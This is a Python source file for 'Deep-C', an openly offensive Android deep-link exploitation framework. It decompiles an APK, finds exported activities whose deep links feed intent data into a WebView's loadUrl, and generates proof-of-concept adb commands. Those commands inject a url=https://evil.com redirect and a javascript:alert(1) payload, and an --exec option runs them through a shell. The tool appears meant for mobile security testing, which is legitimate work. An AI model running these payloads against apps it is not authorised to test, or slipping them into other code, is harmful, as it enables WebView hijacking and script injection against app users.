import xml.etree.ElementTree as ET
import subprocess
import argparse
import os
import shutil
import sys
import json
import re

ANDROID_NS = "{http://schemas.android.com/apk/res/android}"

OUT_DIR = os.path.abspath("deepc_out")
APKTOOL_DIR = os.path.join(OUT_DIR, "apktool")

JADX_OUT_DIR = os.path.abspath("deepc_jadx_out")
SRC_DIR = os.path.join(JADX_OUT_DIR, "sources")


# ---------------- Banner ---------------- #

def banner():
    print(r"""
██████╗ ███████╗███████╗██████╗       ██████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗     ██╔════╝
██║  ██║█████╗  █████╗  ██████╔╝     ██║     
██║  ██║██╔══╝  ██╔══╝  ██╔═══╝      ██║     
██████╔╝███████╗███████╗██║          ╚██████╗
╚═════╝ ╚══════╝╚══════╝╚═╝           ╚═════╝

 Deep-C | Android Deep Link Exploitation Framework By Kishor Balan
 Decompile • Detect • Validate • Exploit
 Usage: python3 deepc.py -a <path_to_apk>  --> Should use the absolute path else JADX will fail
 Btw guys the AI thing needs some optimizations, working on it... 
""")

# ---------------- Helpers ---------------- #

def run(cmd, msg):
    print(f"[*] {msg}")
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def clean_dirs():
    if os.path.exists(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR)

# ---------------- Decompilation ---------------- #

def decompile_manifest(apk):
    run(
        ["apktool", "d", apk, "-o", APKTOOL_DIR, "-f"],
        "Decompiling APK (manifest & resources)"
    )
    manifest = os.path.join(APKTOOL_DIR, "AndroidManifest.xml")
    if not os.path.exists(manifest):
        sys.exit("[-] AndroidManifest.xml not found")
    return manifest
    
def decompile_source_with_jadx(apk):
    if os.path.exists(JADX_OUT_DIR):
        shutil.rmtree(JADX_OUT_DIR)

    os.makedirs(JADX_OUT_DIR, exist_ok=True)

    print("[*] Decompiling APK to Java source (jadx)")
    result = subprocess.run(
        ["jadx", "-d", JADX_OUT_DIR, apk],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    if result.stdout:
        print("[jadx stdout]")
        print(result.stdout)

    if result.stderr:
        print("[jadx stderr]")
        print(result.stderr)

    #if result.returncode != 0:
       # sys.exit("[-] Jadx failed during decompilation")




def verify_jadx_output():
    """
    Ensure jadx produced Java source files.
    """
    if not os.path.exists(SRC_DIR):
        sys.exit("[-] Jadx output directory not found")

    java_files = []
    for root, _, files in os.walk(SRC_DIR):
        for f in files:
            if f.endswith(".java"):
                java_files.append(os.path.join(root, f))
                return  # one is enough

    sys.exit(
        "[-] Jadx did not produce any Java files.\n"
        "    Possible reasons:\n"
        "    - APK is packed/obfuscated\n"
        "    - Jadx failed silently\n"
        "    - Unsupported APK format\n"
        "    Try running: jadx InsecureShop.apk manually"
    )

# ---------------- Manifest Parsing ---------------- #

def parse_manifest(path):
    root = ET.parse(path).getroot()
    return root, root.attrib.get("package")

def is_exported(component):
    exported = component.attrib.get(ANDROID_NS + "exported")
    if exported is None:
        return component.find("intent-filter") is not None
    return exported.lower() == "true"

def extract_deeplinks(activity):
    deeplinks = []
    for intent in activity.findall("intent-filter"):
        actions = [a.attrib.get(ANDROID_NS + "name") for a in intent.findall("action")]
        cats = [c.attrib.get(ANDROID_NS + "name") for c in intent.findall("category")]

        if "android.intent.action.VIEW" not in actions:
            continue
        if "android.intent.category.BROWSABLE" not in cats:
            continue

        for data in intent.findall("data"):
            deeplinks.append({
                "scheme": data.attrib.get(ANDROID_NS + "scheme"),
                "host": data.attrib.get(ANDROID_NS + "host"),
                "path": (
                    data.attrib.get(ANDROID_NS + "path")
                    or data.attrib.get(ANDROID_NS + "pathPrefix")
                    or data.attrib.get(ANDROID_NS + "pathPattern")
                )
            })
    return deeplinks

# ---------------- Source Code Analysis ---------------- #

def find_activity_source(activity):
    name = activity.split(".")[-1] + ".java"
    for root, _, files in os.walk(SRC_DIR):
        if name in files:
            return os.path.join(root, name)
    return None

def extract_paths_from_code(code):
    """
    Supports Java + Kotlin (jadx) patterns:
    - uri.getPath().equals("/web")
    - StringsKt.equals$default(uri.getPath(), "/web", false, 2, null)
    """
    paths = set()

    patterns = [
        r'getPath\(\)\.equals\("([^"]+)"\)',
        r'StringsKt\.equals\$default\(\s*uri\.getPath\(\)\s*,\s*"([^"]+)"\s*,',
        r'uri\.getPath\(\)\s*==\s*"([^"]+)"'
    ]

    for p in patterns:
        for match in re.findall(p, code):
            if match.startswith("/"):
                paths.add(match)

    return list(paths)

def analyze_source(path):
    if not path or not os.path.exists(path):
        return None

    with open(path, "r", errors="ignore") as f:
        code = f.read()

    exploitable = (
        "loadUrl(" in code and
        (
            "getData(" in code or
            "getIntent(" in code or
            "getQueryParameter(" in code
        )
    )

    if not exploitable:
        return None

    if any(x in code for x in ["endsWith(", "contains(", "matches("]):
        confidence = "HIGH"
    elif "getHost().equals" in code or "https://" in code:
        confidence = "LOW"
    else:
        confidence = "MEDIUM"

    return {
        "confidence": confidence,
        "paths": extract_paths_from_code(code),
        "code": code[:4000]
    }

# ---------------- PoC Generation ---------------- #

def generate_pocs(pkg, activity, deeplink):
    scheme = deeplink.get("scheme") or "https"
    host = deeplink.get("host") or ""
    path = deeplink.get("path") or "/"

    base = f"{scheme}://{host}" if host else f"{scheme}://"

    return [
        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?url=https://evil.com"',
        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?url=javascript:alert(1)"',
        f'adb shell am start -n {pkg}/{activity}'
    ]

# ---------------- Main ---------------- #

def main():
    banner()

    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--apk", required=True)
    parser.add_argument("--exec", action="store_true")
    args = parser.parse_args()

    clean_dirs()
    manifest = decompile_manifest(args.apk)
    decompile_source_with_jadx(args.apk)
    verify_jadx_output()

    root, package = parse_manifest(manifest)
    print(f"[+] Package: {package}\n")

    results = {"package": package, "findings": []}

    for app in root.findall("application"):
        for act in app.findall("activity"):
            name = act.attrib.get(ANDROID_NS + "name")
            if not name or not is_exported(act):
                continue

            deeplinks = extract_deeplinks(act)
            if not deeplinks:
                continue

            src = find_activity_source(name)
            analysis = analyze_source(src)
            if not analysis:
                continue

            paths = (
                analysis.get("paths")
                or [dl.get("path") for dl in deeplinks if dl.get("path")]
                or ["/"]
            )

            print("[+] Vulnerable Activity Found")
            print(f"    Activity   : {name}")
            print(f"    Source     : {src}")
            print(f"    Confidence : {analysis['confidence']}")

            for path in paths:
                dl = deeplinks[0]
                dl_effective = {
                    "scheme": dl.get("scheme"),
                    "host": dl.get("host"),
                    "path": path
                }

                print(f"    Entry Path : {path}")
                print("    PoCs:")

                pocs = generate_pocs(package, name, dl_effective)
                for p in pocs:
                    print(f"      {p}")
                    if args.exec:
                        subprocess.run(p, shell=True)

                results["findings"].append({
                    "activity": name,
                    "source": src,
                    "path": path,
                    "confidence": analysis["confidence"],
                    "pocs": pocs
                })

            print("-" * 70)

    with open("deepc_result.json", "w") as f:
        json.dump(results, f, indent=4)

    print("\n[+] Results saved to deepc_result.json")

if __name__ == "__main__":
    main()
